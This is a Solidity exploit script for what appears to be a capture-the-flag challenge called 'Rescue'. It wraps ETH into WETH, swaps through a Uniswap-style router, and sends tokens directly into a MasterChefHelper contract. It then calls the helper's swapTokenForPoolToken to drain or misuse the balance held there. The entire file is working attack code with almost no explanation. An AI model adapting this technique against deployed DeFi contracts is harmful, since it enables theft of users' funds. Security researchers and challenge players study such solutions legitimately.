// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./challenge/Setup.sol";
import "forge-std/console.sol";

function playerScript(address setupAddress) {
    new RescueExploit().exploit{value: 50 ether}(setupAddress);
}

contract RescueExploit {
    function exploit(address setupAddress) public payable {
        MasterChefHelper mcHelper = Setup(setupAddress).mcHelper();
        (address lpToken,,,) = mcHelper.masterchef().poolInfo(0);
        address tokenOut0 = UniswapV2PairLike(lpToken).token0(); // WETH
        address tokenOut1 = UniswapV2PairLike(lpToken).token1();
        console.log(tokenOut0, tokenOut1);

        uint256 amountIn = 10 ether;
        console.log(WETH9(tokenOut0).balanceOf(address(mcHelper)));
        address daiAddress = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
        ERC20Like dai = ERC20Like(daiAddress);
        WETH9(tokenOut0).deposit{value: address(this).balance}();
        WETH9(tokenOut0).approve(address(mcHelper.router()), type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = tokenOut0;
        path[1] = daiAddress;
        mcHelper.router().swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp);

        path[0] = tokenOut0;
        path[1] = tokenOut1;
        mcHelper.router().swapExactTokensForTokens(30 ether, 0, path, address(mcHelper), block.timestamp);

        dai.approve(address(mcHelper), type(uint256).max);
        mcHelper.swapTokenForPoolToken(0, daiAddress, dai.balanceOf(address(this)), 0);
    }
}
